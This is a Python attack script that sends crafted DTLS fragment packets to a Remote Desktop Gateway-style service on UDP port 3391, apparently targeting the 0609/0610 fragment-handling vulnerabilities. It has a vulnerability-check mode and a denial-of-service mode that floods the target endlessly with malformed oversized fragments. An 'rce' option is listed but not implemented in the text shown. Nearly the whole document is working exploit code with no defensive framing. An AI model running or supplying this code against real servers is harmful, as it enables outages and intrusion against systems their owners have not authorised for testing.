from pwn import *
from argparse import *
from cryptography.hazmat.bindings.openssl.binding import Binding
from OpenSSL import SSL
import select

TIMEOUT = 3

# need DTLS sockets
def init_dtls():
    binding = Binding()
    binding.init_static_locks()
    SSL.Context._methods[0] = getattr(binding.lib, "DTLSv1_client_method")

class Packet:
    def __init__(self, fragment, packet_id, fragment_id, num_fragments, fragment_length):

        self.fragment = fragment
        self.packet_id = packet_id
        self.fragment_id = fragment_id
        self.num_fragments = num_fragments
        self.fragment_length = fragment_length

    def __bytes__(self):
        return (struct.pack("<HHHHH",
                            self.packet_id,           # packet id
                            len(self.fragment) + 6,   # packet length
                            self.fragment_id,         # fragment id
                            self.num_fragments,  # number of fragments
                            self.fragment_length      # fragment length
                            ) + self.fragment)


class Connection:
    def __init__(self, host, port, vuln):
        init_dtls()
        self.socket = socket.socket(
            socket.AF_INET, socket.SOCK_DGRAM)
        self.connec = SSL.Connection(SSL.Context(0), self.socket)
        self.connec.connect((host, port))
        self.connec.do_handshake()
        # self.remote = remote.fromsocket(self.socket)
        self.vuln = vuln

    def send(self, packet: Packet):
        self.connec.send(bytes(packet))

    def recv(self, size):
        return self.connec.recv(size)

    def check(self):
        pk = Packet(b"\x00", 5, 0, 65, 1)
        self.send(pk)
            
        ready = select.select([self.socket], [], [], TIMEOUT)
        if ready[0]:
            res = self.recv(16)

            x = not (0x8000ffff == struct.unpack('<L', res[-4:])[0])

            if (x):
                print("Vulnerable")
            else:
                print("Not vulnerable")
        else:
            print("Vulnerable")

    def dos(self):

        # if (self.vuln == 0):
            x = 0
            while x >= 0:
                for i in range(2000):
                    # choose large fragment length but small fragment ids
                    pk = Packet(b"\x20" * 1000, 5, x+i, x+i, 1000)
                    self.send(pk)
                x += 1
        # else:
        #     for i in range(1000):
        #         # choose fragment id >= 65, but small fragment lengths to avoid overflow of first buffer
        #         pk = Packet(b"\x20" * 10, 5, i, i, 10)
        #         self.send(pk)


if __name__ == "__main__":
    p = ArgumentParser()
    p.add_argument("--ip", default='127.0.0.1',
                   help="IP", required=False, type=str)
    p.add_argument("--port", default=3391, help="UDP port",
                   required=False, type=int)
    p.add_argument("--vuln", default=0, help="0: 0609, 1: 0610",
                   required=False, type=int, choices=[0, 1])
    p.add_argument("--attack", default=2, help="0:check, 1:dos, 2:rce",
                   required=False, type=int, choices=[0, 1, 2])

    args = p.parse_args()

    c = Connection(args.ip, args.port, args.vuln)

    if (args.attack == 0):
        c.check()

    elif (args.attack == 1):
        c.dos()
